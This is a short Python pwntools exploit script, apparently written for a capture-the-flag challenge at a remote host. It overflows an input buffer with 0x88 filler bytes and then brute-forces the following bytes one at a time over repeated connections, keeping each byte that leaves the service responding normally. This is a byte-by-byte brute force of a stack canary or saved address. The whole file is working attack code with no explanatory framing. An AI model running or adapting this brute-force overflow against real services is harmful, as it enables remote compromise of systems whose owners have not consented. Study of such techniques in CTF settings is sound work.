#!/usr/bin/env python
# coding=utf-8

from pwn import *
import sys

context.log_level = "debug"
context.timeout = 2

TEST = False

attack_data = "".decode("hex")

if TEST:
    p = remote("chall2.o40.rev.fish", 1983)
    p.recvuntil("Gimme something:\n")
    payload = 'z' * 0x88  + attack_data
    p.send(payload)
    p.recvuntil('z' * 0x80)
    print p.recv(0x1000)

else:
    while len(attack_data) < 40:
        for i in xrange(256):
            p = remote("chall2.o40.rev.fish", 1983)
            p.recvuntil("Gimme something:\n")
            payload = 'z' * 0x88 + attack_data + chr(i)
            p.send(payload)
            p.recvuntil('z' * 0x80)
            data = p.recv(0x1000)
            if "See you!" in data:
                p.close()
                attack_data += chr(i)
                print "%#02X successed! [AttackData: %s]" % (i, attack_data.encode("hex"))
                break
            else:
                p.close()
                print "%#02X failed! [AttackData: %s]" % (i, attack_data.encode("hex"))

    print "AttackData: %s" % attack_data.encode("hex")


